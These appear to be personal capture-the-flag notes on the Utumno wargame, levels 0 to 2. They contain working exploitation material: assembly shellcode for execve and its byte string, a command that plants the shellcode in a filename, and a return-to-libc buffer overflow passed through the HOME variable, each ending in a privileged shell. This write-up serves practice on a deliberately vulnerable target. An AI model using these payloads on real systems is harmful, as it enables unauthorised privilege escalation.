Utumno 0 - 
	started writing my own hook on puts based on this article https://opensourceforu.com/2011/08/lets-hook-a-library-function/
	couldnt' get it to run. so i gave up and looked up someone's solution and i was pretty much on track to get it done. just didnt print out the memory following the hooked readme output.  
	
	<pass_here>
	
Utumno 1 -
	no protections on the file.   has functions:
		0x08048330  exit@plt
		0x08048340  __libc_start_main@plt
		0x08048350  readdir@plt
		0x08048360  strncmp@plt
		0x08048370  opendir@plt
		main is at 0x80484a5
	
	takes an arg that is a directory and uses opendir with it as first arg.
		opendir opens directory and returns point to the first entry in the dir.
		stores in [ebp-0x4]
	
	pushes the points, calls readdir. 
		returns a pointer to a dirent structure representing the next directory entry in the directory stream
		returns NULL when done.
		
		struct dirent {
               ino_t          d_ino;       /* Inode number */
               off_t          d_off;       /* Not an offset; see below */
               unsigned short d_reclen;    /* Length of this record */
               unsigned char  d_type;      /* Type of file; not supported
                                              by all filesystem types */
               char           d_name[256]; /* Null-terminated filename */
           };
		
		stores dirent pointer in ebp-0x8
		
		gets the name of the file by adding 0xb to the dirent pointer. 
		
	compares to "sh_"
		
	 calls function run - overwrites some memory in the file with the bytes following "sh_" in the name.  then passes execution to it. 
	 
	basically it reads shellcode in the filename AFTER sh_ 
	
	python doesn't seem to work writing bytes to a filename so perl will have to do.  
	
	create shellcode --- 
	
		global _start

		section .text

		_start:

			; execv('bash', ['bash'])
			xor eax, eax
			push eax        ; null terminate
			push 0x68736162 ; bash

			mov ebx, esp    ; put file to execute in arg1, 'bash'

			push eax        ; null for end of list
			mov edx, esp

			push ebx        ; push 'bash' again
			mov ecx, esp    ; store list pointer
			mov al, 0xb      ; execv is 0xb
			
			int 0x80
	
		utumno1@utumno:/tmp/pwoer1$ nasm -f elf32 sc.nasm
		utumno1@utumno:/tmp/pwoer1$ ld -m elf_i386 -s -i sc sc.o
		ld: cannot find sc: No such file or directory
		utumno1@utumno:/tmp/pwoer1$ ls
		index.txt  peda-session-utumno1.txt  sc.nasm  sc.o
		utumno1@utumno:/tmp/pwoer1$ ld -m elf_i386 -s -o sc sc.o
		utumno1@utumno:/tmp/pwoer1$ objdump -d ./sc|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s \
		> ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
		"\x31\xc0\x50\x68\x62\x61\x73\x68\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	
	touch `perl -e 'print "sh_\x31\xc0\x50\x68\x62\x61\x73\x68\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
	
	utumno1@utumno:/tmp/pwoer1$ ln -s /bin/sh bash
	utumno1@utumno:/tmp/pwoer1$ ls
	bash  index.txt  peda-session-utumno1.txt  sc  sc.nasm  sc.o
	utumno1@utumno:/tmp/pwoer1$ touch `perl -e 'print "sh_\x31\xc0\x50\x68\x62\x61\x73\x68\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
	utumno1@utumno:/tmp/pwoer1$ /utumno/utumno1 /tmp/pwoer1
	$ id
	uid=16001(utumno1) gid=16001(utumno1) euid=16002(utumno2) groups=16001(utumno1)
	$ cat /etc/utumno_pass/utumno2
	
	<pass_here>

Utumno 2 - 

	file just says Aw.. when run
	
	disass main
	
		0x08048451 <+6>:     cmp    DWORD PTR [ebp+0x8],0x0
		0x08048455 <+10>:    je     0x804846b <main+32>
		
		jumps to:
		
		0x0804846b <+32>:    mov    eax,DWORD PTR [ebp+0xc]
		0x0804846e <+35>:    add    eax,0x28
		0x08048471 <+38>:    mov    eax,DWORD PTR [eax]
		0x08048473 <+40>:    push   eax
		0x08048474 <+41>:    lea    eax,[ebp-0xc]
		0x08048477 <+44>:    push   eax
		0x08048478 <+45>:    call   0x8048300 <strcpy@plt>

	googled how to get argc to equal zero.  apparently you can create a program that runs your target file with execv and a null argv list.
	We are able to follow an execv in gdb by running:
	set follow-fork-mode child
	
	break main, once we hit main, break main again and it will set the break inside of our target program's main. continue to hit your next bp.
	
		#include <stdio.h>
		#include <unistd.h>

		int main( void ) {
			char *argv[]={ NULL };
			char *envp[] = { "AAAAAAAAAAAAAAAABBBB" };
			execv( "/utumno/utumno2", argv );
			return ( 0 );
		}
	
	it seems to take envp and copy that string into a local var.   looks like an overflow.  soo copies it into $ebp-0xc so our overflow should be 0xc + 4    'A'*0x10 + 'B'*0x4   (editing c code above as i go.)
	
	turns out bringing in the envp doesnt change the order.. tried overwriting HOME= but it still loads the local env variable over my envp. 
	
	Lets just change it before we run it..
		export HOME=AAAAAAAAAAABBBB
		
		gdb-peda$ x/3wx $ebp
		0xffffd688:     0x41414141      0x42424242      0x00000000
	
	return value overwritten with B's.. lets make it the address for system and put the address for /bin/sh from libc in there also after it to get a shell.. 
	
		gdb-peda$ p system
		$2 = {<text variable, no debug info>} 0xf7e4c850 <system>
		
		gdb-peda$ find /bin/sh
		Searching for '/bin/sh' in: None ranges
		Found 1 results, display max 1 items:
		libc : 0xf7f6ecc8 ("/bin/sh")

	
		export HOME=`python -c 'print "AAAAAAAAAAA" + "\x50\xc8\xe4\xf7" + "JUNK" + "\xc8\xec\xf6\xf7"'`
		
		utumno2@utumno:/tmp/pwoer2$ ./prog
		Segmentation fault
	
	Lets try doing it while in gdb.. since we are already following fork.. it works.. outside of gdb it doesnt seem to work..
	
	lets ltrace to see wtf is happening..
	
		utumno2@utumno:/tmp/pwoer2$ ltrace ./prog
		execv("/utumno/utumno2", 0x7fffffffe548 <no return ...>
		--- Called exec() ---
		__libc_start_main(0x804844b, 0, 0xffffd734, 0x8048490 <unfinished ...>
		strcpy(0xffffd68c, "SSH_CLIENT=xxx.xxx.xxx.xxx <port>22"...) = 0xffffd68c
		--- SIGSEGV (Segmentation fault) ---
		+++ killed by SIGSEGV +++
	
	lets just add some env variables until i get to one i want to put the overflow in..
	
		utumno2@utumno:/tmp/pwoer2$ export TEST=test
		utumno2@utumno:/tmp/pwoer2$ ltrace ./prog
		execv("/utumno/utumno2", 0x7fffffffe548 <no return ...>
		--- Called exec() ---
		__libc_start_main(0x804844b, 0, 0xffffd734, 0x8048490 <unfinished ...>
		strcpy(0xffffd68c, "WECHALLTOKEN=<token_vale>"...)                                                                                      = 0xffffd68c
		--- SIGSEGV (Segmentation fault) ---
		+++ killed by SIGSEGV +++
	
	I ended up adding 2 more and finally got to the HOME env variable where i originally wanted to be..
	
	
	utumno2@utumno:/tmp/pwoer2$ export HOME=`python -c 'print "AAAAAAAAAAA" + "\x50\xc8\xe4\xf7" + "JUNK" + "\xc8\xec\xf6\xf7"'`
	utumno2@utumno:/tmp/pwoer2$ ./prog
	$ id
	uid=16002(utumno2) gid=16002(utumno2) euid=16003(utumno3) groups=16002(utumno2)
	$ cat /etc/utumno_pass/utumno3
	
	<pass_here>
	
Utumno 3 - 
